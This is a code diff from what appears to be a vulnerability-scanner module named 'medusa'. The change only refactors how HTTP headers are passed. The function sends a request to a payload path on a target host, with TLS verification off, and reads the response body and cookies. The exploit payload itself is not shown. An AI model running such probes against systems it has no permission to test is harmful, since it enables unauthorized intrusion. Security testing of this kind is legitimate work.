@@ -32,7 +32,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -47,14 +47,12 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload_url = scheme + "://" + url +":"+ str(port) + payload
 
         key = '1z2x3c4v5b6n'[0:8]
-        headers = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-        }
+
+        Headers['Content-Type']='application/x-www-form-urlencoded'
+
 
         s = requests.session()
-        resp = s.get(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
+        resp = s.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
         con=resp.text
         dec=resp.content[10:]
         resph= resp.headers.get('Set-Cookie')
